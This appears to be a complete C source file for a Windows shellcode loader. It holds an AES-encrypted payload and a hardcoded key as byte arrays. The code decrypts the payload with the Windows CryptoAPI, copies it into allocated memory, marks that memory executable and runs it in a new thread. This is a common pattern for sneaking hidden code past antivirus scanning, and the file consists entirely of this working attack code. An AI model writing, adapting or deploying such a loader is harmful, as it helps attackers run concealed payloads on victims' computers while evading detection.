#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32.lib")

int aes_decrypt(char *payload, unsigned int payload_sz, char *key, size_t key_sz)
{
	DWORD status = 0; 
	HCRYPTPROV hProv; 
	
	// pointer to a handle, container name, provider, type, flags
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		status = GetLastError(); 
		printf("CryptAcquireContext failed: %x\n", status); 
		CryptReleaseContext(hProv, 0); 
		system("pause"); 
		return status; 
	};
	
	HCRYPTHASH hHash; 
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		status = GetLastError(); 
		printf("CryptCreateHash failed: %x\n", status); 
		CryptReleaseContext(hProv, 0); 
		system("pause"); 
		return status;
	}
	
	// handle of hash, key, key_sz, flags 
	if (!CryptHashData(hHash, (BYTE *)key, (DWORD)key_sz, 0)) {
		status = GetLastError(); 
		printf("CryptHashData failed: %x\n", status); 
		CryptReleaseContext(hProv, 0); 
		system("pause"); 
		return status;
	}	
	
	HCRYPTKEY hKey; 
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		status = GetLastError(); 
		printf("CryptDeriveKey failed: %x\n", status); 
		CryptReleaseContext(hProv, 0); 
		system("pause"); 
		return status;
	}
	
	// decrypt 
	if (!CryptDecrypt(hKey, NULL, 0, 0, payload, &payload_sz)) {
		status = GetLastError(); 
		printf("CryptDecrypt failed: %x\n", status); 
	}
	
	// release and destroy       
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0; 
}

int main(void)
{
	void *exec_mem; 
	
	char key[] = {0x9c, 0x69, 0x8d, 0x5c, 0x62, 0xb, 0x15, 0xc5, 0x5f, 0xb4, 0xb9, 0x54, 0xae, 0xff, 0xbd, 0xb1};
	unsigned char payload[] = {0xb6, 0xb4, 0x86, 0xd3, 0x6b, 0x7e, 0xfe, 0x43, 0xf5, 0xd7, 0xea, 0x15, 0x6a, 0x42, 0xb4, 0xdb, 0x2d, 0x85, 0x7e, 0x22, 0x0, 0x70, 0x18, 0x96, 0xf0, 0x97, 0xa9, 0x54, 0x20, 0xf9, 0x4a, 0x60, 0x5e, 0x83, 0x3c, 0xc5, 0x27, 0xde, 0x6c, 0x26, 0xe2, 0x63, 0x47, 0x8, 0xb8, 0xcb, 0x88, 0x5a, 0x85, 0x88, 0x64, 0xf2, 0x62, 0xb2, 0x94, 0x53, 0x25, 0x4d, 0x52, 0x4c, 0x35, 0xcd, 0xc7, 0xf, 0xbb, 0xf8, 0x12, 0x71, 0xe6, 0xa2, 0xcc, 0x46, 0xa8, 0xcb, 0x28, 0xbc, 0x70, 0x60, 0x9d, 0x7c, 0x19, 0x4f, 0xb3, 0xd2, 0xdd, 0xdd, 0x23, 0x4c, 0x85, 0xc6, 0xf4, 0xd0, 0x5d, 0x9d, 0x9d, 0xd6, 0x12, 0x3b, 0xa3, 0x9, 0x93, 0x46, 0x8a, 0xeb, 0x78, 0x84, 0xa0, 0xd, 0x8c, 0xd, 0x6c, 0xd4, 0xa3, 0x6e, 0x14, 0x30, 0x9f, 0xd9, 0x20, 0x52, 0x4a, 0x7c, 0x11, 0x11, 0xb4, 0x8f, 0xaf, 0x7d, 0xf4, 0x47, 0x3d, 0x12, 0x9a, 0xdc, 0x30, 0x78, 0x13, 0xb9, 0xd8, 0xed, 0x6f, 0x31, 0x6d, 0x92, 0x4c, 0xc2, 0x23, 0x3e, 0x70, 0x11, 0x10, 0x99, 0xf8, 0x52, 0xc4, 0x3d, 0x61, 0x2d, 0x56, 0x49, 0x7, 0x6c, 0x70, 0x94, 0x65, 0x88, 0xee, 0xf8, 0x0, 0x35, 0x5, 0xc0, 0x60, 0x6, 0x9c, 0x1b, 0xa, 0xd8, 0x1e, 0xfb, 0xa3, 0x4f, 0xe3, 0xa3, 0xf, 0x7d, 0x2b, 0xf1, 0xe8, 0x8a, 0x7e, 0x48, 0x73, 0xd3, 0x48, 0xa8, 0x1a, 0xe9, 0x4a, 0xf8, 0x41, 0x80, 0x4e, 0x32, 0xcb, 0xab, 0x9d, 0xe, 0xea, 0xaf, 0x96, 0xcb, 0x9e, 0x92, 0x31, 0xe9, 0x47, 0xb7, 0x7a, 0x79, 0xa2, 0xa1, 0xdf, 0x39, 0xe2, 0x7, 0x2, 0xaf, 0x67, 0x38, 0x5c, 0xcd, 0x19, 0x31, 0x86, 0x7b, 0xb8, 0xc8, 0xc0, 0xa0, 0x6f, 0x5a, 0x6a, 0x16, 0x8e, 0x7e, 0x0, 0x55, 0x45, 0x4c, 0xf8, 0x23, 0xf6, 0xfa, 0xa1, 0x8, 0xe0, 0x9e, 0xba, 0xc5, 0x71, 0x47, 0xd1, 0x73, 0x6d, 0x2, 0x1f, 0xcf, 0xe0, 0xe1, 0x67, 0xcc, 0x48, 0xf9, 0xc0, 0x95, 0xcd, 0x79, 0xe7, 0xce, 0xec, 0xca, 0x69, 0x9a, 0xbe, 0xce, 0xb0, 0x55};
	unsigned int payload_sz = sizeof(payload); 
	
	exec_mem = VirtualAlloc(0, payload_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	
	// decrypt the payload 
	aes_decrypt((char *)payload, payload_sz, key, sizeof(key)); 
	
	// copy the decrypted payload into memory 
	// size remain the same?
	RtlMoveMemory(exec_mem, payload, payload_sz); 
	
	// make the memory executable 
	DWORD old = 0; 
	BOOL rv = VirtualProtect(exec_mem, payload_sz, PAGE_EXECUTE_READ, &old); 

	if (rv != 0) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); 
		WaitForSingleObject(th, -1); 
	}
	
	return 0; 
}